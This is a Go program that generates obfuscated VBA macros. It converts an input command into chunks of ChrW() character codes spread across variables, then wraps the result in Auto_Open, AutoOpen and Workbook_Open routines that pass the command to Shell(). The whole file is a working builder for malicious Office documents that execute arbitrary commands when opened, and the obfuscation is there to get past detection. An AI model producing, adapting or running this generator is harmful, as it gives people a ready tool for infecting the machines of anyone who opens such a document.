package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"unicode/utf8"
)

var (
	code          string
	obfChars      []string
	lines         []string
	variables     []string
	variableNames []string
	postfix       int
	lineEnd       = "\n"
	endSub        = "End Sub\n\n"
)

func main() {
	obfChars = make([]string, 0)
	lines = make([]string, 0)
	variables = make([]string, 0)
	variableNames = make([]string, 0)
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("Enter single line string: ")
	text, _ := reader.ReadString('\n')

	lastRuneIndex := utf8.RuneCountInString(text) - 1
	for index, ch := range text {
		obfChars = append(obfChars, fmt.Sprintf("ChrW(%d)", int(ch)))
		if (index%10 == 0 && index > 0) || index == lastRuneIndex {
			postfix = index
			variables = append(variables, fmt.Sprintf("Dim n0z3r0_%v as String", postfix))
			variableNames = append(variableNames, fmt.Sprintf("n0z3r0_%v", postfix))
			line := fmt.Sprintf("n0z3r0_%v = ", postfix) + strings.Join(obfChars, " & ")
			obfChars = nil
			lines = append(lines, line)
		}
	}

	code += "Sub Auto_Open()\n"
	code += strings.Join(variables, lineEnd)
	code += lineEnd
	code += strings.Join(lines, lineEnd)
	code += lineEnd
	code += "n0z3r0 = " + strings.Join(variableNames, " + ")
	code += lineEnd
	code += "Shell(n0z3r0)\n"
	code += endSub
	code += "Sub AutoOpen()\n"
	code += "Auto_Open\n"
	code += endSub
	code += "Sub Workbook_Open()\n"
	code += "Auto_Open\n"
	code += endSub
	fmt.Println()
	fmt.Println()
	fmt.Println("Obfuscated code:")
	fmt.Println()
	fmt.Println(code)
}
